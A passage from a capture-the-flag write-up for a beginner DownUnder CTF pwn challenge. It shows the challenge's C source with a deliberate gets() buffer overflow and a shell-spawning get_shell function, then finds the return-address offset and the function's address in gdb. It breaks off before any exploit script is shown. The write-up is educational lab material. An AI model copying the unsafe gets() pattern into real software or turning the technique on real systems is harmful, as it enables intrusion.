## DownUnder CTF: shell this [pwn]
> Somebody told me that this program is vulnerable to something called remote code execution?
I'm not entirely sure what that is, but could you please figure it out for me?

#### Baby pwn challenge for the competition. Source code is provided which makes it easier to analyze the challenge. From what we can see, we have a buffer overflow vulnerability due to gets and there is a get_shell function which we need to execute. Plan is simply to overwrite the buffer then redirect code execution to get_shell.
```c
void get_shell() {
    execve("/bin/sh", NULL, NULL);
}

void vuln() {
    char name[40];

    printf("Please tell me your name: ");
    gets(name);
}
```
#### First we need to figure out the offset to control RIP, which in this case is 56. After which we need to print the address of the get_shell function which we can simply do with gdb.
```
pwndbg> p get_shell
$1 = {void ()} 0x4006ca <get_shell>
```
#### Since we now have everything we need, we can create an exploit script.

